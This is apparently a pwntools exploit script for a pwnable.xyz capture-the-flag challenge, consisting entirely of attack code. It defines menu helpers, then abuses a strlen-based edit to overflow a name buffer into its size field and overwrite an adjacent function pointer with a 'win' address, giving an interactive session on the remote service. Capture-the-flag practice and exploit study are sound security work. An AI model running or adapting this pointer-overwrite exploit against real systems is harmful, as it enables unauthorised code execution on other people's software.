from pwn import *

###Structure
'''
    |   8   |   8   |
0x00|     name      |
0x10|     name      |
0x20| size  |funcptr|
'''

###Util
def create(data):
    r.sendlineafter('> ','1')
    r.sendafter('name: ',data)

def edit(idx,data):
    r.sendlineafter('> ','2')
    r.sendlineafter('index: ',str(idx))
    r.sendafter('name: ',data)

def show(idx):
    r.sendlineafter('> ','3')
    r.sendlineafter('index: ',str(idx))

###Addr
win = 0x40092c

###Exploit
r = remote('svc.pwnable.xyz',30023)

###Strlen allows extend buffer into buffer_len
create('a'*0x20)
edit(0,b'a'*0x20+p8(0x30))
edit(0,b'a'*0x20+p64(0x30)+p64(win))
show(0)
r.interactive()
